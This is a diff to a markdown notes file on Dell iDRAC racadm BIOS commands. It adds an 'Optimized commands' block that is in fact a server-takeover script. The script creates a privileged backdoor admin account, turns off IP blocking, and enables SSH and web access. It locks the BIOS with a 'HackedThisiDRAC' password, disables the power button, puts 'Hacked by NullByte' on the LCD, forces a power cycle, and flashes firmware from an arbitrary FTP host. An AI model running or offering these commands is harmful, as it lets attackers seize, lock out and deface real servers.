@@ -1,3 +1,39 @@
+## Optimized commands
+```bash
+racadm config -g cfgUserAdmin -i 10 -o cfgUserAdminUserName "{username}"
+racadm config -g cfgUserAdmin -i 10 -o cfgUserAdminPassword "{password}"
+racadm config -g cfgUserAdmin -i 10 -o cfgUserAdminPrivilege "{privilege}"
+racadm config -g cfgUserAdmin -i 10 -o cfgUserAdminEnable 1
+sh /avct/sbin/enterprise.sh
+
+racadm set iDRAC.IPBlocking.RangeEnable Disabled
+racadm set iDRAC.SSH.Enable 1
+racadm set iDRAC.WebServer.Enable 1
+racadm set BIOS.SysProfileSettings.SysProfile Custom
+racadm set BIOS.SysProfileSettings.EnergyPerformanceBias MaxPower
+racadm set System.Power.Cap.Enable Disabled
+racadm set System.Power.Hotspare.Enable Disabled
+racadm set BIOS.ProcSettings.ControlledTurbo Enabled
+racadm set BIOS.SysProfileSettings.UncoreFrequency MaxUFS
+racadm set BIOS.SysProfileSettings.MemFrequency MaxPerf
+racadm set BIOS.SysProfileSettings.MemPatrolScrub Disabled
+racadm set BIOS.ProcSettings.DynamicCoreAllocation Disabled
+racadm set BIOS.SysProfileSettings.ProcCStates Disabled
+racadm set BIOS.SysProfileSettings.ProcC1E Disabled
+racadm set BIOS.SysProfileSettings.MonitorMwait Disabled
+racadm set System.ThermalSettings.FanSpeedOffset 1
+racadm set BIOS.SysSecurity.PwrButton Disabled
+racadm set BIOS.SysSecurity.SetupPassword HackedThisiDRAC 
+racadm set System.LCD.Configuration 0
+racadm set System.LCD.UserDefinedString "Hacked by NullByte :3     Contact: me@nullbyte.rip" 
+racadm jobqueue create BIOS.Setup.1-1 -r pwrcycle -s TIME_NOW
+```
+
+## Update (Doesnt always work)
+```bash
+racadm fwupdate -g -u -a x.x.x.x -d ftp/updates/firmimg.d7
+```
+
 ## Table of Contents
 1. [System Information](#system-information)
 2. [Processor Settings](#processor-settings)
@@ -13,16 +49,7 @@
 
 ---
 
-## Commands Used
-
-All commands were executed using Dell's Remote Access Controller Administrative Tool (racadm) via iDRAC.
-
-### Command Format
-```
-racadm get BIOS.[CategoryName]
-```
-
-### Actual Commands Sent:
+## BIOS Categories:
 1. `racadm get BIOS.SysInformation`
 2. `racadm get BIOS.ProcSettings`
 3. `racadm get BIOS.MemSettings`
